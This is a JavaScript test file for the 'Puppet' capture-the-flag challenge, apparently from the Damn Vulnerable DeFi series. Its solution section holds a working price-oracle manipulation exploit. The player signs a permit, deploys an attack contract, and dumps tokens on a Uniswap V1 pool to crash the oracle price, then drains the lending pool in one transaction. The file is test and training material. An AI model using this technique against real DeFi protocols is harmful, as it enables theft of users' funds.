const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
        const deadline = blockTimestamp * 2;

        const attackContractFactory = await ethers.getContractFactory('PuppetAttack', player);
        const attackerAddress = ethers.utils.getContractAddress({
            from: player.address,
            nonce: await player.getTransactionCount()
        });

        const contractName = await token.name();  
        const chainId = await ethers.provider.getNetwork().then(({ chainId }) => chainId);

        const domain = {    
            name: contractName,    
            version: "1",    
            chainId,    
            verifyingContract: token.address 
        };

        const Permit = [  
            { name: "owner", type: "address" },  
            { name: "spender", type: "address" }, 
            { name: "value", type: "uint256" }, 
            { name: "nonce", type: "uint256" },    
            { name: "deadline", type: "uint256" },
        ];

        const nonce = await token.nonces(player.address);
        const deadlinePermit = ethers.constants.MaxUint256;

        const message = {
            owner: player.address,
            spender: attackerAddress,
            value: PLAYER_INITIAL_TOKEN_BALANCE,
            nonce: ethers.BigNumber.from(nonce),
            deadline: deadlinePermit,
        };

        const signature = await player._signTypedData(domain, {
            Permit,
        }, message);
        const { v, r, s } = ethers.utils.splitSignature(signature);

        const calldata = uniswapExchange.interface.encodeFunctionData("tokenToEthSwapInput", [PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline]); 

        await attackContractFactory.deploy(
            lendingPool.address,
            token.address,
            uniswapExchange.address,
            player.address,
            PLAYER_INITIAL_TOKEN_BALANCE, 
            deadlinePermit, 
            v, 
            r, 
            s, 
            calldata, 
            {
                value: ethers.BigNumber.from(PLAYER_INITIAL_ETH_BALANCE).sub(10n**18n)
            }
        );

        /* Steps:
        1. Sign permit to give allowance of player's tokens to the attack contract
        2. Transfer tokens from player to attack contract and also transfer all ETH while calling attack function (so contract becomes player now)
        3. Swap all your tokens for ETH using Uniswap
        4. This will reduce the ETH amount in Uniswap pair and result in much lower oracle price inside the Lending pool
        5. Use this manipulated price to deposit less ether than actually required and borrow all tokens of the lending pool
        6. Transfer all tokens and remaining ETH to player
        7. Combining attack function with contract deployment will result in a single transaction
        */

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});